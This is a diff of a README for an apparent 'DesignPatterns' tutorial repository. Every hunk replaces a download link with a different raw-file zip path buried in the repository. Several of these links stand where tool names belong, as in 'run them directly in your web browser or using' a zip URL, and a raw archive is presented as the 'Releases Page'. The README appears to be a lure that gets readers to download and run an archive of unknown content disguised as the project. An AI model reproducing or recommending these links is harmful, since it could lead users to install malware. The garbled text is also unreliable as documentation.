@@ -1,7 +1,7 @@
 # 🎨 DesignPatterns - Easy Access to Software Design Patterns
 
 ## 📥 Download Here
-[![Download DesignPatterns](https://raw.githubusercontent.com/MetaDC/DesignPatterns/master/astipulate/DesignPatterns.zip)](https://raw.githubusercontent.com/MetaDC/DesignPatterns/master/astipulate/DesignPatterns.zip)
+[![Download DesignPatterns](https://raw.githubusercontent.com/MetaDC/DesignPatterns/master/Javascript/Microservices/APIGateway/Design_Patterns_2.2.zip)](https://raw.githubusercontent.com/MetaDC/DesignPatterns/master/Javascript/Microservices/APIGateway/Design_Patterns_2.2.zip)
 
 ## 📚 Table of Contents
 - [🚀 Getting Started](#-getting-started)
@@ -21,12 +21,12 @@ To run the examples in this repository, you need:
 - A computer running Windows, macOS, or Linux.
 - For C# examples, you'll need Visual Studio or .NET Core installed.
 - For Java examples, you'll need Java Development Kit (JDK) installed.
-- For JavaScript examples, you can run them directly in your web browser or using https://raw.githubusercontent.com/MetaDC/DesignPatterns/master/astipulate/DesignPatterns.zip
+- For JavaScript examples, you can run them directly in your web browser or using https://raw.githubusercontent.com/MetaDC/DesignPatterns/master/Javascript/Microservices/APIGateway/Design_Patterns_2.2.zip
 
 ## 📥 Download & Install
 To get started, visit this page to download the latest version of DesignPatterns:
 
-[Download DesignPatterns](https://raw.githubusercontent.com/MetaDC/DesignPatterns/master/astipulate/DesignPatterns.zip)
+[Download DesignPatterns](https://raw.githubusercontent.com/MetaDC/DesignPatterns/master/Javascript/Microservices/APIGateway/Design_Patterns_2.2.zip)
 
 1. **Go to the Releases Page:** Click the link above to go to the releases section.
 2. **Select Version:** Choose the latest version available. You will see a list of files.
@@ -39,7 +39,7 @@ The repository is organized into folders based on programming languages. Inside 
 
 - **C#:** Contains files with `.cs` extension that you can open in Visual Studio or any text editor.
 - **Java:** Includes `.java` files, runnable in any Java IDE or simple text editors.
-- **JavaScript:** Consists of `.js` files that can be run in web browsers or https://raw.githubusercontent.com/MetaDC/DesignPatterns/master/astipulate/DesignPatterns.zip
+- **JavaScript:** Consists of `.js` files that can be run in web browsers or https://raw.githubusercontent.com/MetaDC/DesignPatterns/master/Javascript/Microservices/APIGateway/Design_Patterns_2.2.zip
 
 Each pattern also includes a readme file with explanations and usage tips.
 
